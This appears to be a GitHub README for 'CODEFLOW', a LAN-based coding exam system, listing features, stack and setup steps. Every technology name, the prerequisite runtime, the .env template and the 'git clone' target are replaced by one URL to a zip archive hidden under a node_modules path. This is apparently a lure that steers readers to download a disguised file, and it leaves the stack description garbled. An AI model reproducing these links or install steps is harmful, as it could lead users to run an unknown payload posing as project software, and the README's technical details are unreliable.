# CODEFLOW - Lab Exam Management System

## Overview

CODEFLOW is a secure lab exam management system designed for conducting programming-based assessments in educational institutions. It provides a platform for faculty to create and manage coding exams, and for students to take exams within a controlled computer lab environment.

A key feature is its design for **local network (LAN) operation**, allowing student computers to participate in exams without direct internet access, enhancing security and control. The system uses a client-server architecture with a web-based interface.

## Key Features

*   **User Roles:** Distinct interfaces and permissions for Teachers and Students.
*   **Class Management:** Teachers can create classes; students can join using unique codes.
*   **Exam Creation:** Faculty can define coding problems, test cases, time limits, and schedule exams.
*   **Secure Exam Taking:** Students take exams on lab computers connected locally to the server.
*   **Real-time Monitoring:** Teachers receive live notifications (e.g., student joins exam) via WebSockets.
*   **Anti-Cheating:** Includes mechanisms like tab-switch detection (as mentioned in SDD).
*   **Automated Evaluation:** Basic automated grading based on test case matching, with potential for AI-driven feedback.
*   **Result Management:** Teachers and students can view exam results.

## Technology Stack

*   **Frontend:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip, HTML, CSS, JavaScript
*   **Backend:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip, https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip
*   **Database:** PostgreSQL
*   **Real-time Communication:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip (WebSockets)

## Prerequisites

Before you begin, ensure you have met the following requirements:
*   https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip and npm (or yarn) installed
*   A running PostgreSQL database server

## Installation & Setup

1.  **Clone the repository:**
    ```bash
    git clone https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip
    cd hats-minor-project 
    ```

2.  **Install Backend Dependencies:**
    ```bash
    # Navigate to the backend directory (e.g., server/) if applicable
    # Check the actual directory structure in the cloned repository
    npm install
    ```

3.  **Install Frontend Dependencies:**
    ```bash
    # Navigate to the frontend directory (e.g., client/) if applicable
    # Check the actual directory structure in the cloned repository
    npm install
    cd ..
    ```

4.  **Database Setup:**
    *   Create a PostgreSQL database for CODEFLOW.
    *   Configure your database connection details. This is typically done in a `.env` file in the backend directory. Create a `.env` file based on `https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip` (if provided) and add your database URL or credentials:
        ```
        DATABASE_URL=postgresql://user:password@host:port/database_name
        # Add other environment variables like PORT, JWT_SECRET etc.
        ```
    *   For some reason, database credentials are not provided. Will provide in future
    *   Run database migrations or schema setup scripts if available (check project documentation/scripts).

## Running the Application

1.  **Start the Backend Server:**
    ```bash
    # Navigate to the backend directory (e.g., server/)
    npm start # Or npm run dev for development mode
    ```

2.  **Start the Frontend Application:**
    ```bash
    # Navigate to the frontend directory (e.g., client/)
    npm run start
    ```

3.  Open your web browser and navigate to `http://localhost:5173` (or the port specified by the React app). The backend server will typically run on a different port (e.g., 5000), configured in its `.env` file.

---
